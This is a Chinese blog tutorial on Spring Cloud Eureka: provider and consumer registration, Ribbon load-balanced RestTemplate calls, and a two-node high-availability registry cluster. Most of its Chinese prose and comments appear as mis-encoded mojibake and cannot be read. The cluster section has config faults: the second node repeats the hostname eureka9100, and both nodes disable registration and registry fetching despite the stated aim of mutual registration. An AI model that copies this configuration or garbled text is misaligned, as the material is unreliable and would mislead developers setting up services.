<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šå¦‚æœé€šè¿‡SpringBootçš„å¼€å‘å·¥å…·åˆ›å»ºWebå·¥ç¨‹é‚£ä¹ˆè¿™ä¸ªä¾èµ–ä»¥åŠä¾èµ–ç®¡ç†æ˜¯è‡ªåŠ¨æ·»åŠ  çš„</p>
<p>  <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134874.png" alt="image-20201216204047337"></p>
<ol start="3">
<li>ä¿®æ”¹æœåŠ¡æä¾›è€…çš„application.propertiesæ–‡ä»¶ï¼Œé…ç½®æœåŠ¡åç§°å’Œæ³¨å†Œä¸­å¿ƒåœ°å€</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#æŒ‡å®šæœåŠ¡åå­— è¿™ä¸ªåç§°å°†åœ¨æœåŠ¡æ¶ˆè´¹è€…æ—¶è¢«è°ƒç”¨</span><br><span class="line">spring.application.name= <span class="number">02</span>-springcloud-eureka-client-provider</span><br><span class="line">#æŒ‡å®šeurekaçš„è®¿é—®åœ°å€</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//localhost:9100/eureka</span></span><br><span class="line">#æŒ‡å®šTomcatçš„ç«¯å£å·éœ€è¦é¿å…å’Œå…¶ä»–çš„Tomcatç«¯å£å†²çª</span><br><span class="line">server.port=<span class="number">8081</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>æ¿€æ´»Eurekaä¸­çš„EnableEurekaClientåŠŸèƒ½ï¼š</p>
<p>åœ¨Spring Bootçš„å…¥å£å‡½æ•°å¤„ï¼Œé€šè¿‡æ·»åŠ @EnableEurekaClientæ³¨è§£æ¥è¡¨æ˜è‡ªå·±æ˜¯ä¸€ä¸ªeurekaå®¢æˆ·ç«¯ï¼Œè®©æˆ‘çš„æœåŠ¡æ¶ˆè´¹è€…å¯ä»¥ä½¿ç”¨eurekaæ³¨å†Œä¸­å¿ƒ</p>
</li>
<li><p>ç¼–å†™æ§åˆ¶å™¨æä¾›æœåŠ¡</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è‡ªå®šä¹‰æ§åˆ¶å™¨ç±»å¯¹å¤–æä¾›æœåŠ¡</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ä½¿ç”¨äº†eurekaæ³¨å†Œä¸­å¿ƒçš„æœåŠ¡æä¾›è€…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>å¯åŠ¨æœåŠ¡æä¾›è€…SpringBootç¨‹åºçš„mainæ–¹æ³•è¿è¡Œï¼›</p>
</li>
<li><p>å¯åŠ¨è¿è¡Œä¹‹åï¼Œé€šè¿‡åœ¨æµè§ˆå™¨åœ°å€æ è®¿é—®æˆ‘ä»¬ä¹‹å‰æ­å»ºå¥½çš„eurekaæ³¨å†Œä¸­å¿ƒï¼Œå°±å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªæœåŠ¡å·²ç»æ³¨å†ŒæˆåŠŸäº†ï¼›</p>
</li>
</ol>
<h2 id="3-8-ä»EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒå‘ç°ä¸æ¶ˆè´¹æœåŠ¡"><a href="#3-8-ä»EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒå‘ç°ä¸æ¶ˆè´¹æœåŠ¡" class="headerlink" title="3.8 ä»EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒå‘ç°ä¸æ¶ˆè´¹æœåŠ¡"></a>3.8 ä»EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒå‘ç°ä¸æ¶ˆè´¹æœåŠ¡</h2><p>æˆ‘ä»¬å·²ç»æ­å»ºä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼ŒåŒæ—¶ä¹Ÿå‘è¿™ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒæ³¨å†Œäº†æœåŠ¡ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å‘ç°å’Œæ¶ˆè´¹æœåŠ¡äº†ï¼Œè¿™å…¶ä¸­æœåŠ¡çš„å‘ç°ç”±eurekaå®¢æˆ·ç«¯å®ç°ï¼Œè€ŒæœåŠ¡çš„æ¶ˆè´¹ç”±Ribbonå®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´æœåŠ¡çš„è°ƒç”¨éœ€è¦eurekaå®¢æˆ·ç«¯å’ŒRibbonä¸¤è€…é…åˆèµ·æ¥æ‰èƒ½å®ç°ï¼›</p>
<p><strong>Eurekaå®¢æˆ·ç«¯æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Eurekaå®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªJavaå®¢æˆ·ç«¯ï¼Œç”¨æ¥è¿æ¥EurekaæœåŠ¡ç«¯ï¼Œä¸æœåŠ¡ç«¯è¿›è¡Œäº¤äº’ã€è´Ÿè½½å‡è¡¡ï¼ŒæœåŠ¡çš„æ•…éšœåˆ‡æ¢ç­‰ï¼›</p>
<p><strong>Ribbonæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Ribbonæ˜¯ä¸€ä¸ªåŸºäºHTTP å’Œ TCP çš„å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡å™¨ï¼Œå½“ä½¿ç”¨Ribbonå¯¹æœåŠ¡è¿›è¡Œè®¿é—®çš„æ—¶å€™ï¼Œå®ƒä¼šæ‰©å±•Eurekaå®¢æˆ·ç«¯çš„æœåŠ¡å‘ç°åŠŸèƒ½ï¼Œå®ç°ä»Eurekaæ³¨å†Œä¸­å¿ƒä¸­è·å–æœåŠ¡ç«¯åˆ—è¡¨ï¼Œå¹¶é€šè¿‡Eurekaå®¢æˆ·ç«¯æ¥ç¡®å®šæœåŠ¡ç«¯æ˜¯å¦å·±ç»å¯åŠ¨ã€‚Ribbonåœ¨Eurekaå®¢æˆ·ç«¯æœåŠ¡å‘ç°çš„åŸºç¡€ä¸Šï¼Œå®ç°äº†å¯¹æœåŠ¡å®ä¾‹çš„é€‰æ‹©ç­–ç•¥ï¼Œä»è€Œå®ç°å¯¹æœåŠ¡çš„è´Ÿè½½å‡è¡¡æ¶ˆè´¹ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è®©æœåŠ¡æ¶ˆè´¹è€…å»æ¶ˆè´¹æœåŠ¡ï¼š</p>
<p>æˆ‘ä»¬å‰é¢æ­å»ºäº†æœåŠ¡æ¶ˆè´¹è€…é¡¹ç›®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¯¥æœåŠ¡æ¶ˆè´¹è€…é€šè¿‡æ³¨å†Œä¸­å¿ƒå»è°ƒç”¨æœåŠ¡æä¾›è€…ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>åœ¨è¯¥æ¶ˆè´¹è€…é¡¹ç›®ä¸­æ·»åŠ eurekaçš„ä¾èµ–ï¼Œå› ä¸ºæœåŠ¡æ¶ˆè´¹è€…ä»æ³¨å†Œä¸­å¿ƒè·å–æœåŠ¡ï¼Œéœ€è¦è¿æ¥eurekaï¼Œæ‰€ä»¥éœ€è¦eurekaå®¢æˆ·ç«¯çš„æ”¯æŒï¼›</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--SpringCloudé›†æˆeurekaå®¢æˆ·ç«¯çš„èµ·æ­¥ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<ol start="2">
<li>å¿…é¡»æ·»åŠ Mavençš„ä¾èµ–ç®¡ç†å™¨ï¼Œå¦åˆ™eurekaæ— æ³•è¢«è¯†åˆ«</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"> </span><br><span class="line">æ³¨æ„ï¼šå¦‚æœé€šè¿‡SpringBootçš„å¼€å‘å·¥å…·åˆ›å»ºWebå·¥ç¨‹é‚£ä¹ˆè¿™ä¸ªä¾èµ–ä»¥åŠä¾èµ–ç®¡ç†æ˜¯è‡ªåŠ¨æ·»åŠ  çš„</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>é…ç½®æœåŠ¡çš„åç§°å’Œæ³¨å†Œä¸­å¿ƒçš„åœ°å€ï¼š</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŒ‡å®šæœåŠ¡çš„åç§° å³ä½¿æ˜¯æœåŠ¡çš„æ¶ˆè´¹è€…ä¹Ÿä¼šå°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ</span><br><span class="line">spring.application.name=02-springcloud-eureka-client-consumer</span><br><span class="line">#æŒ‡å®šEurekaæ³¨å†Œä¸­çš„è®¿é—®åœ°å€</span><br><span class="line">eureka.client.service-url.defaultZone=http://localhost:9100/eureka</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>æ¿€æ´»Eurekaä¸­çš„EnableEurekaClientåŠŸèƒ½ï¼š</p>
<p>åœ¨Spring Bootçš„å…¥å£å‡½æ•°å¤„ï¼Œé€šè¿‡æ·»åŠ @EnableEurekaClientæ³¨è§£æ¥è¡¨æ˜è‡ªå·±æ˜¯ä¸€ä¸ªeurekaå®¢æˆ·ç«¯ï¼Œè®©æˆ‘çš„æœåŠ¡æ¶ˆè´¹è€…å¯ä»¥ä½¿ç”¨eurekaæ³¨å†Œä¸­å¿ƒï¼›</p>
</li>
<li><p>å‰é¢æˆ‘ä»‹ç»äº†æœåŠ¡çš„å‘ç°ç”±eurekaå®¢æˆ·ç«¯å®ç°ï¼Œè€ŒæœåŠ¡çš„çœŸæ­£è°ƒç”¨ç”±ribbonå®ç°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨è°ƒç”¨æœåŠ¡æä¾›è€…æ—¶ä½¿ç”¨ribbonæ¥è°ƒç”¨ï¼š</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨Ribbonçš„è´Ÿè½½å‡è¡¡ä»æ³¨å†Œä¸­å¿ƒä¸­è·å–æœåŠ¡</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>è°ƒç”¨æœåŠ¡<br>åŠ å…¥äº†ribbonçš„æ”¯æŒï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨æ—¶ï¼Œå³å¯æ”¹ä¸ºä½¿ç”¨æœåŠ¡åç§°æ¥è®¿é—®ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//è®¿é—®SpringCloud æä¾›çš„æœåŠ¡ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦å†æ¬¡æŒ‡å®šæœåŠ¡æä¾›è€…çš„åœ°å€äº†ï¼Œåªéœ€è¦é€šè¿‡æœåŠ¡çš„åå­—åˆ°</span></span><br><span class="line">        <span class="comment">//Eurekaçš„æ³¨å†Œä¸­å¿ƒä¸­æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡æä¾›è€…</span></span><br><span class="line">        <span class="comment">//å…¶ä¸­02-SPRINGCLOUD-EUREKA-CLIENT-PROVIDER å°±æ˜¯æœåŠ¡çš„æä¾›çš„æœåŠ¡å</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForEntity(<span class="string">&quot;http://02-SPRINGCLOUD-EUREKA-CLIENT-PROVIDER/test&quot;</span>,String.class).getBody()+<span class="string">&quot;----å¸¦æœ‰æ³¨å†Œä¸­å¿ƒçš„æœåŠ¡æ¶ˆè´¹è€…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p>å®Œæˆä¸Šé¢çš„æ­¥éª¤åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯åŠ¨æ¶ˆè´¹è€…çš„SpringBootç¨‹åºï¼Œmainæ–¹æ³•è¿è¡Œï¼›</p>
</li>
<li><p>å¯åŠ¨æˆåŠŸä¹‹åï¼Œé€šè¿‡åœ¨æµè§ˆå™¨åœ°å€æ è®¿é—®æˆ‘ä»¬çš„æ¶ˆè´¹è€…ï¼Œçœ‹æ˜¯å¦å¯ä»¥æ­£å¸¸è°ƒç”¨è¿œç¨‹æœåŠ¡æä¾›è€…æä¾›çš„æœåŠ¡ï¼›æµè§ˆå™¨è¾“å…¥<a href="http://localhost:8080/test">http://localhost:8080/test</a> è¿›è¡Œæµ‹è¯•</p>
</li>
</ol>
<h1 id="ç¬¬å››ç« -æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka"><a href="#ç¬¬å››ç« -æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka" class="headerlink" title="ç¬¬å››ç«  æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka"></a>ç¬¬å››ç«  æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka</h1><h2 id="4-1-Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ¦‚è¿°"><a href="#4-1-Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ¦‚è¿°" class="headerlink" title="4.1 Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ¦‚è¿°"></a>4.1 Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ¦‚è¿°</h2><p>åœ¨å¾®æœåŠ¡æ¶æ„çš„è¿™ç§åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬è¦å……åˆ†è€ƒè™‘å„ä¸ªå¾®æœåŠ¡ç»„ä»¶çš„é«˜å¯ç”¨æ€§é—®é¢˜ï¼Œä¸èƒ½æœ‰å•ç‚¹æ•…éšœï¼Œç”±äºæ³¨å†Œä¸­å¿ƒeurekaæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡ï¼Œå¦‚æœå®ƒåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒæœ‰å¯èƒ½å‘ç”Ÿæ•…éšœï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸èƒ½æ³¨å†Œä¸æŸ¥è¯¢æœåŠ¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé«˜å¯ç”¨çš„æœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œè¿™å°±éœ€è¦é€šè¿‡æ³¨å†Œä¸­å¿ƒé›†ç¾¤æ¥è§£å†³ã€‚</p>
<p>eurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒå®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡ï¼Œå®ƒä¹Ÿå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªæä¾›è€…ï¼Œåˆå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªæ¶ˆè´¹è€…ï¼Œæˆ‘ä»¬ä¹‹å‰é€šè¿‡é…ç½®ï¼š</p>
<p>eureka.client.register-with-eureka&#x3D;false è®©æ³¨å†Œä¸­å¿ƒä¸æ³¨å†Œè‡ªå·±ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘å…¶ä»–æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·±ï¼›</p>
<p>Eureka Serverçš„é«˜å¯ç”¨å®é™…ä¸Šå°±æ˜¯å°†è‡ªå·±ä½œä¸ºæœåŠ¡å‘å…¶ä»–æœåŠ¡æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·±ï¼Œè¿™æ ·å°±ä¼šå½¢æˆä¸€ç»„äº’ç›¸æ³¨å†Œçš„æœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œè¿›è€Œå®ç°æœåŠ¡æ¸…å•çš„äº’ç›¸åŒæ­¥ï¼Œå¾€æ³¨å†Œä¸­å¿ƒAä¸Šæ³¨å†Œçš„æœåŠ¡ï¼Œå¯ä»¥è¢«å¤åˆ¶åŒæ­¥åˆ°æ³¨å†Œä¸­å¿ƒBä¸Šï¼Œæ‰€ä»¥ä»ä»»ä½•ä¸€å°æ³¨å†Œä¸­å¿ƒä¸Šéƒ½èƒ½æŸ¥è¯¢åˆ°å·²ç»æ³¨å†Œçš„æœåŠ¡ï¼Œä»è€Œè¾¾åˆ°é«˜å¯ç”¨çš„æ•ˆæœã€‚</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134875.png" alt="image-20201216210302515">                              </p>
<h2 id="4-2-Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ­å»º"><a href="#4-2-Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ­å»º" class="headerlink" title="4.2 Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ­å»º"></a>4.2 Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æ­å»º</h2><p>æˆ‘ä»¬çŸ¥é“ï¼ŒEurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤å°±æ˜¯å„ä¸ªæ³¨å†Œä¸­å¿ƒç›¸äº’æ³¨å†Œï¼Œæ‰€ä»¥ï¼š</p>
<ol>
<li><p>åˆ›å»º2ä¸ªSpringBoot çš„Eurekaçš„æœåŠ¡ç«¯é¡¹ç›®åˆ†åˆ«ä¸ºï¼š</p>
<p>03-springcloud-eureka-server-cluster-9100</p>
<p>03-springcloud-eureka-server-cluster-9200</p>
</li>
<li><p>åˆ†åˆ«æ·»åŠ ä¾èµ–åŒ…</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>åˆ†åˆ«ä¿®æ”¹2ä¸ªé¡¹ç›®çš„application.propertiesæ–‡ä»¶</p>
<p>03-springcloud-eureka-server-cluster-9100 çš„application.properties</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#å†…åµŒå®šæ—¶tomcatçš„ç«¯å£</span><br><span class="line">server.port=<span class="number">9100</span></span><br><span class="line">#è®¾ç½®è¯¥æœåŠ¡æ³¨å†Œä¸­å¿ƒçš„hostname</span><br><span class="line">eureka.instance.hostname=eureka9100</span><br><span class="line">#ç”±äºæˆ‘ä»¬ç›®å‰åˆ›å»ºçš„åº”ç”¨æ˜¯ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œè€Œä¸æ˜¯æ™®é€šçš„åº”ç”¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªåº”ç”¨ä¼šå‘æ³¨å†Œä¸­å¿ƒï¼ˆä¹Ÿæ˜¯å®ƒè‡ªå·±ï¼‰æ³¨å†Œå®ƒè‡ªå·±ï¼Œè®¾ç½®ä¸º<span class="literal">false</span>è¡¨ç¤ºç¦æ­¢è¿™ç§è‡ªå·±å‘è‡ªå·±æ³¨å†Œçš„é»˜è®¤è¡Œä¸º</span><br><span class="line">eureka.client.register-with-eureka=<span class="literal">false</span></span><br><span class="line">#è¡¨ç¤ºä¸å»æ£€ç´¢å…¶ä»–çš„æœåŠ¡ï¼Œå› ä¸ºæœåŠ¡æ³¨å†Œä¸­å¿ƒæœ¬èº«çš„èŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå®ƒä¸éœ€è¦å»æ£€ç´¢å…¶ä»–æœåŠ¡</span><br><span class="line">eureka.client.fetch-registry=<span class="literal">false</span></span><br><span class="line">#æŒ‡å®šæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„ä½ç½®</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9200:9200/eureka</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>03-springcloud-eureka-server-cluster-9200 çš„application.properties </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#å†…åµŒå®šæ—¶tomcatçš„ç«¯å£</span><br><span class="line">server.port=<span class="number">9200</span></span><br><span class="line">#è®¾ç½®è¯¥æœåŠ¡æ³¨å†Œä¸­å¿ƒçš„hostname</span><br><span class="line">eureka.instance.hostname=eureka9100</span><br><span class="line">#ç”±äºæˆ‘ä»¬ç›®å‰åˆ›å»ºçš„åº”ç”¨æ˜¯ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œè€Œä¸æ˜¯æ™®é€šçš„åº”ç”¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªåº”ç”¨ä¼šå‘æ³¨å†Œä¸­å¿ƒï¼ˆä¹Ÿæ˜¯å®ƒè‡ªå·±ï¼‰æ³¨å†Œå®ƒè‡ªå·±ï¼Œè®¾ç½®ä¸º<span class="literal">false</span>è¡¨ç¤ºç¦æ­¢è¿™ç§è‡ªå·±å‘è‡ªå·±æ³¨å†Œçš„é»˜è®¤è¡Œä¸º</span><br><span class="line">eureka.client.register-with-eureka=<span class="literal">false</span></span><br><span class="line">#è¡¨ç¤ºä¸å»æ£€ç´¢å…¶ä»–çš„æœåŠ¡ï¼Œå› ä¸ºæœåŠ¡æ³¨å†Œä¸­å¿ƒæœ¬èº«çš„èŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå®ƒä¸éœ€è¦å»æ£€ç´¢å…¶ä»–æœåŠ¡</span><br><span class="line">eureka.client.fetch-registry=<span class="literal">false</span></span><br><span class="line">#æŒ‡å®šæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„ä½ç½®</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9100:9100/eureka</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>ç„¶ååœ¨æœ¬åœ°hostsæ–‡ä»¶é…ç½®ï¼šC:\Windows\System32\drivers\etc\hosts</p>
<p><strong>127.0.0.1 eureka9100</strong></p>
<p><strong>127.0.0.1 eureka9200</strong></p>
</li>
</ol>
<p>åˆ†åˆ«å¯åŠ¨ä¸¤ä¸ªæ³¨å†Œä¸­å¿ƒï¼Œè®¿é—®ä¸¤ä¸ªæ³¨å†Œä¸­å¿ƒé¡µé¢ï¼Œè§‚å¯Ÿæ³¨å†Œä¸­å¿ƒé¡µé¢æ˜¯å¦æ­£å¸¸ï¼›</p>
<p><a href="http://eureka9100:9100/">http://eureka9100:9100</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134876.png" alt="image-20201216210609548"> </p>
<p><a href="http://eureka9200:9200/">http://eureka9200:9200</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134877.png" alt="image-20201216210628585">  </p>
<h2 id="4-3-Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æµ‹è¯•"><a href="#4-3-Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æµ‹è¯•" class="headerlink" title="4.3 Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æµ‹è¯•"></a>4.3 Eurekaæ³¨å†Œä¸­å¿ƒé«˜å¯ç”¨é›†ç¾¤æµ‹è¯•</h2><p>æœåŠ¡ç«¯é…ç½®å·ä»¥åéœ€è¦è¿›è¡Œæ³¨å†Œçš„æœåŠ¡ä¸­é…ç½®ï¼š</p>
<ol>
<li><p>åˆ›å»ºæœåŠ¡çš„ç”Ÿäº§è€…é¡¹ç›®SpringBooté¡¹ç›®</p>
<p>03-springcloud-eureka-client-cluster-provider</p>
</li>
<li><p>æ·»åŠ ä¾èµ–åŒ…</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        